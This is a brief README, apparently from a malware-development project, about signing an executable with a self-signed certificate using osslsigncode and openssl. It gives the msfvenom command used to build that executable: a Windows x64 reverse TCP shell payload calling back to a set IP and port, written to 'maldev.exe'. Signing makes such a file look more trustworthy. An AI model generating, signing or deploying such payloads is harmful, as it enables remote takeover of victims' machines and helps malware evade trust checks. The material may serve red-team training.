# Concept

Usage of `osslsigncode` and `openssl` to sign an executable with a self signed certificate.

## The executable used was generated as follows:
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o maldev.exe
```

# Compiling

```bash
$ make
```